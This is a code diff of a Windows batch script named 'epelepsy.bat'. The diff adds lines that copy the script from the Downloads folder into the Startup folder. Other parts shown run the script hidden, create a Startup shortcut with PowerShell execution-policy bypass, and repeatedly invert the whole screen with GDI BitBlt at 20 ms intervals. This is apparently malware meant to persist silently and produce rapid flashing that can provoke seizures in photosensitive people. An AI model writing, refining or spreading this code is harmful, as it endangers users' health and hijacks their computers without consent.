@@ -7,7 +7,8 @@ if "%~1" neq "hidden" (
     exit /b
 )
 
-copy "D:\epelepsy.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+copy "%USERPROFILE%\Downloads\epelepsy.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+copy "%USERPROFILE%\Downloads\epelepsy(1).bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "$s=(New-Object -COM WScript.Shell).CreateShortcut('%StartupFolder%\epelepsy.lnk');$s.TargetPath='%TargetFile%';$s.WorkingDirectory='D:\';$s.Save()"
@@ -33,4 +34,5 @@ if(($c%%3)-eq 0){[Effects]::BitBlt($d,0,0,$w,$h,$d,0,0,0x00550009)}; ^
 [Effects]::ReleaseDC([IntPtr]::Zero,$d); ^
 $c++; ^
 Start-Sleep -Milliseconds 20 ^
+
 }"
